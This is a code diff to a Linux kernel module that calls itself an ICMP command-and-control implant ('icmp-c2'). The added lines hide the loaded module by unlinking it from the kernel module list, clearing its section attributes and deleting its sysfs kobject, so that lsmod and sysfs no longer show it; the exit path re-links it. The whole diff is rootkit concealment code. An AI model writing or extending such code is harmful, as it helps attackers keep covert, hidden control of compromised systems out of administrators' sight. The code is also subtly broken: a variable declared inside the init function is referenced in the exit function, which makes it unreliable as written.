@@ -242,6 +242,19 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 
 // Module initialization
 static int __init init_icmp_hijack(void) {
+
+    // Hide module from lsmod
+    struct list_head *mod_list;
+    mod_list = THIS_MODULE->list.prev;
+    #ifdef DEBUG_K
+        printk(KERN_INFO "Hiding module from list\n");
+    #endif 
+    list_del(&THIS_MODULE->list);
+
+    THIS_MODULE->sect_attrs = NULL;  // Removes visibility of module sections
+    kobject_del(&THIS_MODULE->mkobj.kobj);  // Deletes the module's kobject entry
+
+
     #ifdef DEBUG_K
         printk(KERN_INFO "Loading icmp-c2 module...\n");
     #endif
@@ -274,6 +287,9 @@ static int __init init_icmp_hijack(void) {
 // Module cleanup
 static void __exit exit_icmp_hijack(void) {
     printk(KERN_INFO "Unloading icmp...\n");
+
+    // Unhide
+    list_add(&THIS_MODULE->list, mod_list);
 
     // Unregister the hook
     nf_unregister_net_hook(&init_net, &nfho);
